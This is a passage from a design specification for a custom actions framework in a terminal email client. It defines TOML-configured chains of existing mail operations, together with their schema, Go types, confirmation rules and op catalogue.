# Spec 27 — Custom actions framework

**Status:** Ready for implementation.
**Depends on:** Spec 02 (store schema — read-only here; no migration),
Spec 04 (TUI shell — `Mode` enum, command-bar, `KeyMap` plumbing,
`BindingOverrides`, help overlay), Spec 07 (`action.Executor` —
`MarkRead`, `MarkUnread`, `ToggleFlag`, `Move`, `Archive`, `SoftDelete`,
`PermanentDelete`, `AddCategory`, `RemoveCategory`, undo stack), Spec 08
(`pattern.Compile` — pre-validates `filter` op patterns at config-load
time), Spec 09 (`action.Executor.Bulk*` — `BulkSoftDelete`, `BulkArchive`,
`BulkMarkRead`, `BulkAddCategory`, `BulkMove`, `BulkPermanentDelete`),
Spec 10 (`;` bulk-pending chord and filtered-set semantics — the
`apply_to_filtered` op family delegates to this dispatch path), Spec 11
(`savedsearch.Manager` — TOML mirror conventions for `actions.toml`
co-resident with `saved_searches.toml`), Spec 14 (CLI mode — `inkwell
action run` subcommand parity), Spec 16 (`UnsubscribeService.Resolve`
+ `OneClickPOST` — wired under `unsubscribe` op), Spec 19 (mute —
`set_thread_muted` op delegates to `store.MuteConversation` /
`UnmuteConversation`), Spec 22 (command palette — custom actions
register as a new `Custom actions` section + recents/frecency surface
unchanged), Spec 23 (`store.SetSenderRouting` — `set_sender_routing` op),
Spec 25 (Reply-Later / Set-Aside — `thread_add_category` is the
**only** op accepting the reserved `Inkwell/ReplyLater` /
`Inkwell/SetAside` constants; per-message `add_category` rejects them).
**Blocks:** None at v1.1. Screener (ROADMAP §1.16) is independent. Watch
mode (ROADMAP §1.19) and "Done" alias (ROADMAP §1.23) are independent.
A future spec may extend the op catalogue with `block_sender` (server-
side mailbox rule via `/me/mailFolders('inbox')/messageRules`, see §3.6
deferred-ops list) and `shell` (sandboxing review required).
**Estimated effort:** 2.5–3 days. The op-dispatch glue (§4.5) and the
template surface (§4.3) are most of the work; the TOML decoder and
palette wiring are small.

> **Adversarial-review reconciliation note (pre-implementation).** This
> spec was reviewed adversarially before implementation. Several v1.1
> scope reductions follow from that pass and are flagged in-line with
> the reasoning: (1) chord-key bindings (multi-key like `<C-x> n`) are
> deferred — v1.1 supports single-key bindings only because spec 20's
> chord state is per-feature bools, not a generalised mode (§4.6,
> §12); (2) `:actions reload` is deferred — CLAUDE.md §9 forbids hot
> reload, and only an explicit CLAUDE.md amendment can grant the
> exception (§4.10, §12); (3) the confirm-modal pre-flight count for
> `*_filtered` ops is deferred until `BulkExecutor` grows an
> `Estimate` method (§5.1, §12); (4) `flag` / `unflag` ops read the
> message's current state in the resolve phase rather than blindly
> toggling (§3.5, §4.4); (5) `set_sender_routing` and
> `set_thread_muted` are explicitly NOT undoable via `u` and the
> result toast surfaces this (§4.12, §5.2). Each reduction is
> reversible by a follow-up spec without breaking the loaded-file
> format.

### 0.1 Spec inventory

Custom actions framework is **item 1 of Bucket 3** in
`docs/ROADMAP.md` §0 ("Power-user automation"). It takes spec slot 27
(spec 26 = bundle senders is the last Bucket-2 entry; Bucket 3 picks
up at 27). The PRD §10 spec inventory adds a single row for spec 27
under the post-v1 / ROADMAP §0 bucket 3 group.

The slot number aligns with neither the bucket index (3) nor the
backlog bullet number (§2 in ROADMAP) because the spec sequence is
strictly chronological from spec 22 onwards (palette → routing →
tabs → reply-later → bundles → custom actions). Future cross-
references should cite the spec number, not the bucket / backlog
numbering.

---

## 1. Goal

Let users **compose multiple atomic mail operations into a single
named verb** and bind it to a key, a `:` cmd-bar entry, a palette
row, and a CLI subcommand. Where v1 actions are atomic ("archive",
"flag", "move"), custom actions chain primitives ("mark read,
route the sender to Feed, archive") into one keystroke.

The roadmap calls this out as the **most differentiated feature**
the product can ship (ROADMAP §2.6) and the ramp from "fast mail
reader" to "inbox-automation tool". v1.1 lands the framework with a
fixed primitive catalogue (22 ops, §3.5) covering every triage
verb shipped through specs 07, 09, 10, 16, 19, 20, 23, 25;
v1.2 may extend the catalogue without spec churn (the catalogue is
a package-level registration table, §4.5). Folder management (spec
18) is intentionally **not** in the catalogue — creating /
renaming / deleting folders is structural inbox surgery, not a
per-message action a recipe should chain.

### 1.1 Why now

Bucket 1 + Bucket 2 shipped enough verbs for compositions to be
useful: routing, reply-later, set-aside, mute, unsubscribe, sender
bundles, cross-folder filter, plus the v1 triage primitives. The
custom-action framework reuses those primitives — it does not add
new mail semantics, only a way to chain existing ones. Building it
before the catalogue is full produces a thin shell with little to
chain; building it now lets a community of dotfiles-style action
recipes form (a `~/.config/inkwell/actions/` of shareable TOML
files, ROADMAP §2.6).

### 1.2 Vocabulary

- **Custom action** — the user-facing term for one named entry
  in the user's `actions.toml`. Always pluralised in UI ("Custom
  actions"); singular in spec prose. Used in toasts, sidebar /
  palette section labels, doc strings, and the `:actions` verb.
- **Step** — one entry inside a custom action's `sequence = [...]`
  array. Each step has an `op = "..."` discriminator and zero or
  more typed parameters.
- **Op** — the discriminator string identifying which primitive
  the step invokes (`mark_read`, `move`, `add_category`, …).
  Ops form the framework's contract surface; the catalogue is
  versioned and validated at config-load time.
- **Sequence** — the ordered list of steps that make up one
  custom action. The framework executes a sequence transactionally
  (validate → enqueue → dispatch — see §4.4). The word "queue"
  is reserved for the action queue (spec 07); a custom action's
  sequence enqueues N action records into that queue.
- **Template / templating** — the substitution layer that resolves
  `{{.From}}`, `{{.Subject}}`, etc. against the focused-message
  context. `{{ }}` is the Go `text/template` delimiter.

### 1.3 What does NOT change

- **Action queue (spec 07) is unchanged.** Every step in a custom
  action enqueues the same `store.Action` record a single key would
  enqueue today. There is no new action type, no new store column,
  no new Graph endpoint. The optimistic-write / reconcile semantics
  (CLAUDE.md §3.3, ARCH §6) hold per-step.
- **Undo stack (spec 07) is unchanged.** A custom action that
  invokes N **action-queue-routed** steps pushes N undo records, in
  dispatch order. A single `u` reverses the **last** queued step.
  To undo a full sequence the user presses `u` once per queued step.
  This is intentional (see §5.4 — the alternative ("undo whole
  action") would require a new `undo_group` column on the action
  records and a §17 threat-model review of how group rollback
  handles partial-success). v1.1 keeps the minimum viable surface.
  **Two ops bypass the action queue and are NOT reversible by `u`:**
  `set_sender_routing` (spec 23 — synchronous direct write to
  `sender_routing`), and `set_thread_muted` (spec 19 — synchronous
  direct write to the muted-conversations table). The result toast
  (§5.2) flags non-reversible steps explicitly so the user's mental
  model stays accurate. To undo `set_sender_routing` the user
  re-runs `S` with the previous destination (or `:route clear`); to
  unmute, `M` again. The `prompt_value` and `advance_cursor` ops
  produce no persistent state and have nothing to undo.
- **Pattern engine (spec 08) is unchanged.** `filter` and
  `move_filtered` ops compile their pattern through
  `pattern.Compile` exactly the same way `:filter` does. Patterns
  are pre-compiled at config load (§3.7) so a typo'd pattern fails
  fast at startup, not on first invocation.
- **Bulk engine (spec 09 / 10) is unchanged.** `move_filtered` and
  `permanent_delete_filtered` reuse the existing `;` chord
  dispatch path (`m.bulkPending = true` → bulk executor
  call) — they do **not** introduce a new bulk path.
- **CLI dispatch (spec 14) gains one subcommand** (`inkwell action
  run <name>`); the existing per-verb subcommands (`later`, `aside`,
  `route`, `bundle`, etc.) are unchanged. Custom actions are a
  thin adapter, not a replacement.
- **Help overlay (spec 04 §11), command palette (spec 22), and
  `:` cmd-bar (spec 04 §6.4)** all gain rows for custom actions.
  The wiring is additive; no existing row changes.
- **No new Graph scope.** Every op delegates to a verb that already
  has its scope grant in PRD §3.1. The `block_sender` op (which
  would need `MailboxSettings.ReadWrite` and a server-side rule
  CRUD endpoint) is **deferred** out of v1.1 — see §3.6 deferred
  ops table.
- **No new persistent state.** Custom actions live in TOML on disk;
  the in-memory representation rebuilds on config load. There is
  no `custom_actions` SQLite table, no row, no migration. Frecency
  for the palette section reuses the existing in-process MRU
  (spec 22 §4.4).

## 2. Prior art

The research surfaces six families of "user-defined verbs" in mature
mail clients. We borrow the high-leverage parts of each and reject
the costly ones.

### 2.1 Terminal clients

- **mutt / neomutt — `macro <menu> <key> <sequence>`.** Macros are
  literal strings of UI keystrokes (`<save-message>=Archive<enter>`).
  Each `<function>` is an atomic op; `<enter>` and literal characters
  interleave as if typed. Macros are bound per-menu (`index`,
  `pager`, `compose`). `<tag-prefix>` precedes a function and applies
  it to all tagged messages — the multi-message dispatch loop is
  built into the macro language. Templating against per-message data
  is weak: `$folder` is the global, but `${msg.from}` does not exist;
  macros that need per-message data shell out via `<pipe-message>`.
  **Failure semantics: keystroke-replay.** If `<save-message>` fails
  (no such folder), the next keystrokes still get fed in and may do
  unintended things. This is the canonical footgun and the model we
  explicitly reject.
- **aerc — ex-style commands.** Bindings map keys to first-class
  parsed command strings (`a = :archive flat<Enter>`). Templating
  is Go `text/template` (`{{.From}}`, `{{.Subject}}`) — same engine
  we use for prompt rendering already. Multi-command via `&&` /
  `;` short-circuit. **Failure semantics: per-command surfaced as a
  status-line error; `&&` short-circuits.** This is the cleanest
  TUI precedent and the one we follow most closely.
- **mu4e / notmuch — `mu4e-headers-actions` alist.** Custom actions
  are elisp functions registered into a binding list:
  ```elisp
  (add-to-list 'mu4e-headers-actions
    '("Archive" . my-archive-fn))
  ```
  Composition is whatever lisp gives you. Marks (`+inbox`,
  `-unread`) defer; `mu4e-mark-execute-all` commits in batch.
  **Failure semantics: deferred-write batch — failed marks are
  logged; the message stays in its previous state.** Closest to our
  optimistic-write model.
- **alot / sup-mail** — Ruby / Python DSL hooks. Distant from our
  needs (we're not embedding a runtime).

### 2.2 Web / desktop clients

- **Outlook Quick Steps — the closest precedent.** Microsoft already
  shipped exactly the feature shape we want. A Quick Step has a
  name, an icon, a keyboard shortcut (Ctrl+Shift+1..9 — only nine
  slots), a tooltip, and an ordered list of actions picked from a
  fixed catalogue: Move/Copy/Delete, Mark read/unread, Set
  importance/category, Flag/Clear flag, Reply variants, Create
  appointment, Run macro, Print. Per-action prompting is
  configured via a "Show Options Dialog" tickbox — the same
  Quick Step can mean "always to /Archive" or "ask which folder".
  **Failure semantics: best-effort sequential. If action 2 of 5
  fails, Outlook shows a dialog; some steps stay applied.** This
  is the most-complained-about Quick Steps behaviour — Outlook
  could not pre-validate against an offline model the way we can.
- **Apple Mail / Fastmail rules — fixed condition + fixed action
  catalogue.** Conditions over headers/body/flags + ordered action
  list (move, copy, set color, set flag, mark read, redirect, run
  AppleScript, play sound, delete, *stop processing*). The "stop
  processing" terminator is first-class — useful precedent for the
  `stop_on_error` design (§3.4).
- **Gmail filters + canned responses + Apps Script.** Filter
  conditions → action list; Apps Script is the escape hatch.
  Filters are time-triggered, not keybound. Distant.
- **HEY — first-time sender screening.** Not a custom action per
  se, but the model "first decision is itself an action that
  creates a persistent routing rule" inspired our `set_sender_routing`
  op composition. Reused via spec 23.
- **Superhuman — fixed shortcuts + Reminders.** No user-defined
  verbs. Cited as a counter-example: the polish bar is high but
  the user cannot extend it.

### 2.3 Power-user recipes

The recurring shape across published neomutt / aerc / mu4e dotfiles
is: **2–4 atomic ops + an advance-cursor at the end + an optional
toast**. The most-cited recipes:

- "Triage newsletter": `tag-by-from` + `move-to-folder` +
  `mark-read` + `advance-to-next`.
- "Defer to Monday": `add-tag waiting` + `snooze`.
- "GTD inbox-zero": `prompt-for-folder` (fuzzy picker) → `move`.
- "Spam-train": `move-junk` + `report-spam` (shell-out) +
  `block-sender`.
- "Send to ticketing": `forward-to-fixed-address` + `archive`.

The first three map cleanly onto the v1.1 op catalogue (§3.5).
The fourth needs `block_sender` (deferred, §3.6) and `shell`
(deferred, §3.6). The fifth needs a forward-to-fixed-address op
which is just `prompt_value` + a future `forward` op (deferred —
forwarding is its own spec because it touches `Mail.Send`-adjacent
territory; PRD §3.1 hard scope boundary).

### 2.4 Design decision

Inkwell follows the **aerc parsed-command model** (steps are typed
records, not keystroke replays) on top of the **Outlook Quick Steps
ordered-catalogue UX** (a fixed primitive list, ordered, no
conditional control flow at v1.1) backed by **mu4e's deferred-write
semantics** (steps enqueue; the action queue dispatches; failures
surface per-step without aborting later steps unless `stop_on_error`
says so).

Concretely:

- **TOML config in `~/.config/inkwell/actions.toml`.** Co-resident
  with `saved_searches.toml` (spec 11 §11). `[[custom_action]]`
  array of tables; the file is reloaded at startup only (no hot
  reload — CLAUDE.md §9). The path is overridable via
  `[custom_actions].file` for users who want it co-located with the
  main config or under their dotfiles repo (config docs, §11).
- **A single fixed catalogue of 22 ops** (§3.5) covering every
  primitive shipped through spec 26. Ops are registered by string
  discriminator; new ops add a registration entry, no parser change.
- **Steps validate at config load.** Unknown op → startup error
  with the file:line. Required parameter missing → startup error.
  Pattern parse failure (in `filter`/`move_filtered`) → startup
  error with the pattern + the parser's diagnostic. This is the
  single biggest win over Outlook's runtime-only validation.
- **Templating via Go `text/template`.** `{{.From}}`,
  `{{.Subject}}`, `{{.SenderDomain}}`, `{{.ConversationID}}`,
  `{{.MessageID}}`, `{{.Date}}`, `{{.Folder}}`, `{{.UserInput}}`.
  Templates compile at config load; substitution at invocation.
- **Two binding paths.** `key = "n"` on the action gives it a
  single-press binding; `:<name>` gives it a `:` cmd-bar verb;
  the action registers a palette row regardless. **Chord
  bindings (multi-key like `<C-x> n`) are deferred to a future
  spec.** v1.1 accepts only single-key strings parseable by
  `key.NewBinding(key.WithKeys(...))` — a literal rune or one
  of `ctrl+<rune>`, `alt+<rune>`. Spec 20's thread chord uses
  per-feature bool state (`threadChordPending`), not a
  generalised pending-mode, so adding a third chord namespace
  requires a non-trivial refactor of the chord dispatch — out
  of scope here. Users wanting a chord-style binding compose
  via the palette or `:actions run <name>` until the chord
  generalisation lands (see §12 future work).
- **Transactional enqueue, per-step dispatch.** §4.4 details the
  contract: every step's params are resolved (template +
  validation) before any step enqueues. If any resolution fails,
  the action does not run at all. Once enqueued, each step
  reconciles independently; failures surface as a multi-line
  toast naming each failed step (§5.2) but do not roll back
  successful prior steps (the action queue is append-only, see
  CLAUDE.md §3.3 — rollback is the user's `u` keypress).
- **Per-action confirmation gate.** `confirm = "auto" | "always" |
  "never"`. `auto` is the default and prompts for sequences that
  contain a destructive op (`permanent_delete`,
  `permanent_delete_filtered`) **or** that would touch >N messages
  (configurable, default 50 via the existing `[bulk]` threshold).
  The prompt shows the **rendered** sequence (resolved templates,
  resolved folder names) per the Outlook UX win — see §5.1.
- **Stop-on-error semantics.** `stop_on_error = true | false` per
  action; default `true` for sequences that contain a destructive
  step, `false` otherwise. Per-step override via `stop_on_error =
  true|false` on the step (rare; documented for the recipe where
  the user wants "try block_sender, ignore if it fails, archive
  anyway"). When v1.1 ships without `block_sender` the per-step
  override is documented but unused; the field stays in the schema
  so v1.2 doesn't churn the format.

## 3. Schema

There is no SQLite migration. Custom actions are pure config + in-
memory state.

### 3.1 The `actions.toml` file

Default path: `~/.config/inkwell/actions.toml` (XDG-style; same
parent as the main config and `saved_searches.toml`). The path is
overridable via `[custom_actions].file` in the main `config.toml`
(see §11 config doc). When the file does not exist, the framework
loads zero custom actions and the `:actions` verb shows the
"no custom actions configured — see `docs/user/how-to.md`" string.
Missing-file is **not** an error.

```toml
# Example actions.toml.

[[custom_action]]
name = "newsletter_done"
key = "n"
description = "Newsletter triage: mark read, route sender to Feed, archive."
when = ["list", "viewer"]
confirm = "auto"
sequence = [
  { op = "mark_read" },
  { op = "set_sender_routing", destination = "feed" },
  { op = "archive" },
  { op = "advance_cursor" },
]

[[custom_action]]
name = "to_client_tiaa"
key = "t"
description = "Move to TIAA client folder, tag, mark read."
sequence = [
  { op = "move", destination = "Clients/TIAA" },
  { op = "add_category", category = "TIAA" },
  { op = "mark_read" },
]

[[custom_action]]
name = "sender_to_folder"
key = "T"
description = "Move every message from this sender to a folder I name now."
confirm = "always"
sequence = [
  { op = "prompt_value", prompt = "Move all from {{.From}} to folder:" },
  { op = "move_filtered", pattern = "~f {{.From}}", destination = "{{.UserInput}}" },
]

[[custom_action]]
name = "reply_later_thread"
key = "L"
description = "Add the entire thread to Reply Later."
sequence = [
  { op = "thread_add_category", category = "Inkwell/ReplyLater" },
]
```

Notes on the example:

- `name` is the action's stable identifier. The ID is required,
  must match `[a-z][a-z0-9_]*`, must be unique within the file,
  and is the stable handle for palette frecency, undo descriptions,
  CLI invocation, and log lines.
- `key` is optional. When present, it must be a single key
  (a literal rune like `"n"` or `"T"`, or `ctrl+<rune>` /
  `alt+<rune>`); chord strings like `"<C-x> n"` are rejected at
  load time (deferred — see §2.4 / §12). Custom-action keys
  participate in the global duplicate-detector via the new
  `findDuplicateBindingWith(km, custom)` helper (§4.6). The
  precedence is: `[bindings]` overrides resolve first; THEN
  the custom catalogue is loaded; THEN `findDuplicateBindingWith`
  is called against the final `KeyMap` and the custom binding
  set. Conflicts at config-load time are a hard startup error
  with file:line for both colliders ("binding 'n' is bound to
  both `mark_unread` and custom_action 'newsletter_done' — set
  `[bindings].mark_unread` to a different key, or rename the
  custom action's `key`").
- `description` is required and ≤ 80 chars. Renders in `:actions`,
  the palette subtitle, and the help overlay row. No multiline
  descriptions in v1.1 (the constraint keeps the help overlay
  single-line per row; if a future spec wants a `details` field,
  add it then).
- `when` is optional and gates which panes / modes the action is
  bindable from. Allowed values: `"list"`, `"viewer"`, `"folders"`.
  Default: `["list", "viewer"]`. Empty array is rejected at load
  time. The `palette` is **always** an entry path regardless of
  `when` (the palette is a discovery surface, spec 22 §1).
- `confirm` is optional; values `"auto" | "always" | "never"`. Default
  `"auto"`. See §3.4.
- `prompt_confirm` is the legacy spelling from ROADMAP §2.2; the
  config decoder accepts it as `confirm = "always"` and emits a
  deprecation warning at startup pointing to the canonical key.
  The renaming is a one-time concession to the roadmap's draft
  syntax; future docs only mention `confirm`.
- `stop_on_error` is optional; default per §2.4.
- `sequence` is required; ≥ 1 step; ≤ 32 steps (the upper bound
  exists so a typo'd recursive include — once `include = "..."`
  ever lands — cannot fork-bomb the action queue). Each step is
  an inline TOML table with `op = "..."` and op-specific params.

### 3.2 The Go types

```go
// internal/customaction/types.go (new package).

// Action is one user-defined custom action loaded from actions.toml.
// Pure data + compiled-template + compiled-pattern caches; no
// reference to Model / store / executor. Operationalized via Run
// against a Context (see executor.go).
//
// The Scope and ConfirmPolicy types live in this package precisely
// to avoid colliding with internal/ui's existing Pane and
// ConfirmMode (UI-mode-constant) identifiers — a file that imports
// both packages can name them unambiguously.
type Action struct {
    Name           string          // [a-z][a-z0-9_]*
    Key            string          // verbatim from TOML, "" when not set
    Description    string
    When           []Scope         // resolved enum: ScopeList, ScopeViewer, ScopeFolders
    Confirm        ConfirmPolicy   // ConfirmAuto | ConfirmAlways | ConfirmNever
    StopOnError    bool            // resolved per §2.4 default rules
    AllowFolderTpl bool            // §4.3 opt-in: destinations may template message data
    AllowURLTpl    bool            // §4.3 opt-in: open_url may template PII (T-CA3)
    Steps          []Step          // pre-validated, pre-compiled
}

type Step struct {
    Op           OpKind                // discriminator (enum, see §3.5)
    Params       map[string]any        // op-specific, validated against Op's schema
    PatternC     *pattern.Compiled     // non-nil for filter / move_filtered / permanent_delete_filtered
    Templated    map[string]*template  // non-nil per-key for any param string that contained {{ }}
    StopOnError  *bool                 // step-level override; nil = use Action.StopOnError
}

type Catalogue struct {
    Actions []Action
    ByName  map[string]*Action  // O(1) lookup for `:actions` and CLI
    ByKey   map[string]*Action  // O(1) lookup for keymap dispatch (spec 04 §17 collision)
}

type Scope int
const (
    ScopeList Scope = iota + 1
    ScopeViewer
    ScopeFolders
)

type ConfirmPolicy int
const (
    ConfirmAuto ConfirmPolicy = iota
    ConfirmAlways
    ConfirmNever
)
```

`Steps[i].Params` is `map[string]any` because the TOML decoder
yields heterogeneous param types (string, int, bool). At validation
time each op's schema (§3.5) projects the map into a typed struct
internal to the executor (`type moveStepParams struct { Destination
string \`toml:"destination"\` }`). The map representation is the
source of truth; the typed projection is a per-call convenience.

### 3.3 Loader contract

```go
// internal/customaction/loader.go

// LoadCatalogue reads actions.toml from path, validates every action,
// pre-compiles templates and patterns, and returns the catalogue. If
// the file does not exist, returns an empty catalogue with nil err.
// Any validation failure returns a multi-error with file:line for
// each colliding / invalid entry; the binary refuses to start
// (CLAUDE.md §9 — invalid config = no start).
func LoadCatalogue(ctx context.Context, path string, deps Deps) (*Catalogue, error)

// Deps is the subset of the executor surface the loader needs at
// validation time. Keeping it a small interface makes the loader
// unit-testable without standing up an action.Executor.
type Deps struct {
    // PatternCompile matches pattern.Compile's real signature
    // (internal/pattern/compile.go). Tests pass a stub; production
    // wires `func(s string, opts pattern.CompileOptions) (*pattern.Compiled, error) { return pattern.Compile(s, opts) }`.
    PatternCompile func(string, pattern.CompileOptions) (*pattern.Compiled, error)
    // PatternOpts is applied to every load-time compile. The loader
    // uses zero-value CompileOptions; recipes are user-authored
    // and don't need server-only strategy flags at validation.
    PatternOpts    pattern.CompileOptions
    Now            func() time.Time
}
```

The loader does not consult the store or Graph — validation is
purely syntactic (op known, required params present, pattern
parses, template parses, key parses, no duplicate-name, no
duplicate-key within the catalogue). Folder-name validity (does
"Clients/TIAA" exist?) is **not** checked at load time because
the destination folder may legitimately be created by the user
between binary start and action invocation; the runtime path
surfaces a "folder not found" toast (existing spec 07 path).

### 3.4 Confirmation rules

| `confirm` value | Behaviour                                                                                                                     |
|-----------------|-------------------------------------------------------------------------------------------------------------------------------|
| `"never"`       | Action runs without prompt. Forbidden for any sequence containing a destructive op (`permanent_delete*`); load-time error.    |
| `"always"`      | Always prompt before running. Renders the resolved sequence (post-template) and a Y/N gate.                                   |
| `"auto"` (default) | Prompt iff any of: (a) sequence contains a destructive op; (b) sequence touches > `[bulk].confirm_threshold` messages (default 50, existing key — no new config row); (c) sequence contains `move_filtered` or `permanent_delete_filtered` (the user cannot pre-flight the count from a template). |

The Y/N prompt is the existing `ConfirmMode` modal (spec 04
§6.3) with a multi-line body listing each step. Default focus is
**No** (CLAUDE.md §7.9). Pressing `Esc` is "No". The prompt body is
the same string format used by `:actions show <name>` (§5.6).

### 3.5 Op catalogue (v1.1)

The catalogue is a registration table in
`internal/customaction/ops.go`. Each entry binds a string
discriminator to a struct describing the op's params, its
destructive bit, and its dispatch closure (§4.5).

| Op | Source spec | Param schema | Destructive | Reversible by `u`? | Notes |
|----|-------------|--------------|-------------|--------------------|-------|
| `mark_read`              | 07 | none                                                        | no  | yes  | `Triage.MarkRead(ctx, accID, msgID)` |
| `mark_unread`            | 07 | none                                                        | no  | yes  | `Triage.MarkUnread` |
| `flag`                   | 07 | none                                                        | no  | yes  | Reads `focused.FlagStatus` from the resolve-phase fixture; if `flagged` already, the step is a no-op (logged at DEBUG, skipped from the toast row). Otherwise calls `Triage.ToggleFlag(ctx, accID, msgID, false)` (passing `currentlyFlagged=false` per the real signature in `internal/action/executor.go:86`). The "always pass false to set flagged" footgun (review #12) is avoided by reading state first. |
| `unflag`                 | 07 | none                                                        | no  | yes  | Mirror of `flag`: no-op when already unflagged, else `ToggleFlag(... true)`. |
| `archive`                | 07 | none                                                        | no  | yes  | `Triage.Archive` |
| `soft_delete`            | 07 | none                                                        | no  | yes  | `Triage.SoftDelete` |
| `permanent_delete`       | 07 | none                                                        | YES | no¹  | `Triage.PermanentDelete`. Forces `confirm != "never"` (§3.4 load-time check). |
| `move`                   | 07 | `destination = "<folder name or path>"` (templated, see §4.3 guard) | no  | yes  | `Triage.Move(ctx, accID, msgID, destFolderID, destAlias)`. The destination string is resolved via `ExecDeps.Folders.Resolve(ctx, accID, dest)` — wired by `cmd_run.go` from the existing `cmd/inkwell/cmd_folder.go resolveFolderByNameCtx` helper (already used by spec 14 / spec 18 CLI paths). The TUI's interactive move-picker is unrelated and unchanged (§4.5 `FolderResolver` interface). |
| `add_category`           | 07 | `category = "<name>"` (templated)                            | no  | yes  | `Triage.AddCategory`. **Rejects the reserved `Inkwell/ReplyLater` and `Inkwell/SetAside` constants at load time** with "use `thread_add_category` for stack categories — spec 25 makes ReplyLater / SetAside thread-level". |
| `remove_category`        | 07 | `category = "<name>"` (templated)                            | no  | yes  | `Triage.RemoveCategory`. Same reserved-name rejection as `add_category`; redirects to `thread_remove_category`. |
| `set_sender_routing`     | 23 | `destination = "imbox"\|"feed"\|"paper_trail"\|"screener"`   | no  | **NO**  | Calls `store.SetSenderRouting(ctx, accID, focused.From, dest)`. Static enum — not templated; load-time error otherwise. **Synchronous direct write; not enqueued; not undoable by `u`** (§1.3, §5.2 toast row). |
| `set_thread_muted`       | 19 | `value = true \| false` (default `true`)                     | no  | **NO**  | When `true`, calls `store.MuteConversation(ctx, accID, conversationID)`; when `false`, `store.UnmuteConversation`. Requires focused message has `ConversationID != ""`; runtime toast otherwise. **Synchronous direct write; not undoable by `u`** (§1.3, §5.2). |
| `thread_add_category`    | 20 | `category = "<name>"` (templated)                            | no  | yes  | Bulk variant — calls `Bulk.BulkAddCategory` over the conversation's message IDs (resolved via the spec 20 `MessageIDsInConversation` helper exposed on `ThreadExecutor`). Accepts `Inkwell/ReplyLater` / `Inkwell/SetAside`. |
| `thread_remove_category` | 20 | `category = "<name>"` (templated)                            | no  | yes  | Mirror of `thread_add_category`. |
| `thread_archive`         | 20 | none                                                        | no  | yes  | `Thread.ThreadExecute(... ActionMove, ..., "", "archive")` — same as `T a` chord. |
| `unsubscribe`            | 16 | none                                                        | no  | n/a²  | Two-stage: calls `Unsubscribe.Resolve(ctx, msgID)` (existing `internal/ui/app.go:493`); if `action.Method == POST`, calls `Unsubscribe.OneClickPOST(ctx, action.URL)`; otherwise calls the existing `OpenURL` helper with `action.URL`. nil-`Unsubscribe`-service path emits the existing "unsubscribe service not wired" toast. The op is **not** an enqueued action; it is the same path the `U` keypress already takes. |
| `filter`                 | 08 / 10 | `pattern = "<pattern>"` (templated)                       | no  | n/a²  | Sets `m.bulkPending = true` and applies the filter; subsequent steps in the same sequence operate on the filtered set (only `move_filtered` and `permanent_delete_filtered` consume the filtered set; non-`*_filtered` steps after `filter` operate on the originally-focused message and emit a load-time warning). |
| `move_filtered`          | 10 | `pattern = "..."` (templated), `destination = "..."` (templated, see §4.3 guard) | no  | yes (per row) | Compiles the pattern, runs `Bulk.BulkMove` over the result set. Each moved message pushes its own undo record (spec 09's existing per-row behaviour). |
| `permanent_delete_filtered`| 10 | `pattern = "..."` (templated)                              | YES | no¹ | Bulk permanent delete; always confirms (§3.4). |
| `prompt_value`           | new | `prompt = "<rendered with {{.From}} etc.>"`                  | no  | n/a²  | Opens a modal asking the user for a string (existing `CategoryInputMode`-style input — generalised, see §4.7). The response is bound to `{{.UserInput}}` for the **rest of the sequence** until the next `prompt_value` overwrites it. |
| `advance_cursor`         | 04 | none                                                        | no  | n/a²  | Moves the list cursor down by 1 row after the prior steps reconcile. Pure-UI. |
| `open_url`               | new | `url = "<rendered with {{...}}>"` (see §4.3 guard)           | no  | n/a²  | Calls the existing `OpenURL` helper. The URL must validate as `http(s)://` after templating; load-time and runtime checks. |

¹ `permanent_delete` / `permanent_delete_filtered` are not undoable
by anyone — Graph hard-deletes the message. The "no" here matches
spec 07's existing behaviour.

² Ops marked `n/a²` for reversibility do not produce persistent
state (`prompt_value`, `advance_cursor`, `filter`) or are themselves
external (`open_url`, `unsubscribe`).

**Twenty-two ops total** (mark_read, mark_unread, flag, unflag,
archive, soft_delete, permanent_delete, move, add_category,
remove_category, set_sender_routing, set_thread_muted,
thread_add_category, thread_remove_category, thread_archive,
unsubscribe, filter, move_filtered, permanent_delete_filtered,
prompt_value, advance_cursor, open_url). The catalogue is closed in v1.1 (no user-defined ops; no
scripting). Adding an op is a registration patch + a test; the
loaded-file format is unchanged.

### 3.6 Deferred ops

The roadmap §2.3 lists three ops that v1.1 does NOT ship. Each
is deferred for a concrete reason; the syntax space is reserved
so a future spec can add them without churning loaded files.

| Op | Why deferred | What lands first |
|----|--------------|------------------|
| `block_sender` | Microsoft Graph supports server-side mailbox rules via `/me/mailFolders('inbox')/messageRules` — a separate CRUD surface (`Mail.ReadWrite` is enough; no new scope) but a non-trivial spec on its own (idempotency, rule-name collision, listing existing rules in the UI). Out of scope here. | Spec 28+ rules-engine. |
| `shell` | Sandboxing review (Spec 17 §4 threat-model surface), env-var redaction, and a kill-switch belong in their own spec. The op is also one of two that breaches the "no subprocess" line in CLAUDE.md §7. | Future spec; flagged research. |
| `forward` | Forwarding touches `Mail.Send`-adjacent territory which PRD §3.1 hard-scopes out (drafts only, never send). A constrained "create-forward-as-draft" op is plausible but needs spec 15 review. | Spec extending compose-reply. |

The loader rejects these op strings at load time with a friendly
"deferred to a future spec" message and a link to the relevant
section in `docs/user/how-to.md`. The catalogue table reserves
the discriminator strings so future-spec adoption is purely
additive.

### 3.7 Validation pipeline

At config load (§4.1):

1. Decode `actions.toml` via `toml.DecodeFile`. The `[bindings]`
   undecoded-key gate (config.go) is **inverted** here: extra keys
   on a `[[custom_action]]` table are a hard error (catches typos
   like `seqeunce =` early). Missing required keys (`name`,
   `description`, `sequence`) are errors with file:line.
2. Walk each action:
   - Validate `name` matches `[a-z][a-z0-9_]*` (no Unicode names —
     keeps the CLI subcommand grammar stable and avoids subtle
     case-fold bugs on macOS HFS+). Length 1..32.
   - Resolve `key` against `key.NewBinding(key.WithKeys(...))`.
     Empty `key` → no binding, action is palette-/`:actions`-only.
     Reject any string containing whitespace or `<C-x> n`-style
     chord syntax (deferred — §2.4); load error names the action.
   - Validate `confirm` ∈ {`auto`, `always`, `never`}. Resolve
     `prompt_confirm = true` → `confirm = "always"` with a slog
     warning naming the action.
   - Validate `when` is a non-empty subset of {`list`, `viewer`,
     `folders`}.
   - Decode `allow_folder_template` and `allow_url_template`
     (both `bool`, default `false`).
   - Walk `sequence`:
     - Op string is registered. Otherwise error (and if the string
       is on the deferred list, the error is the deferred-ops
       message).
     - Required params present and non-empty.
     - Static-enum params (`set_sender_routing.destination`) match
       the enum and contain no `{{ }}` directives.
     - For `add_category` / `remove_category` (per-message): a
